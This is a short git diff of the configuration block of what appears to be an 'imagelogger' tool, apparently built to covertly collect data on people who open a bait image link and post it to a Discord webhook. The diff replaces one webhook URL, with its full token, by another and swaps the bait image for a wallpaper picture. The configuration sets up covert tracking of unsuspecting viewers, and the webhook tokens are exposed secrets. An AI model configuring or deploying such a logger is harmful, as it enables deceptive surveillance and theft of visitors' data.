@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1455734197686898801/MC4hlGAo5oFmWwwiykWxAJgaPPuTCdMzfthFFfo6bbTd7GqCA9Jyoh16TX7wJRjG0fws",
-    "image": "https://tenor.com/de/view/cat-cat-thumbs-up-cat-human-thumb-gif-7609195960331442878", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1455737015680372900/kEew6gWD37K2ce0GgaQkhM9u-FugsD03Co6tQBHSnR-ywHQ1euikkLjCUYAYb2QHNjFM",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=fwfqgrtN&id=EC241A781CE453DB792EE4C81DC109FD0D7DB449&thid=OIP.fwfqgrtN_Osj1hAEyTFamwHaE7&mediaurl=https%3A%2F%2Fgadgetadvisor.com%2Fwp-content%2Fuploads%2F2023%2F06%2FMicrosofts-Bliss.jpeg&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.7f07ea82bb4dfceb23d61004c9315a9b%3Frik%3DSbR9Df0JwR3I5A%26pid%3DImgRaw%26r%3D0&exph=1125&expw=1688&q=bliss+desktop&FORM=IRPRST&ck=C594006912A5E4A90D03A3E45CD5DF01&selectedIndex=0&itb=0&cw=1721&ch=853&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
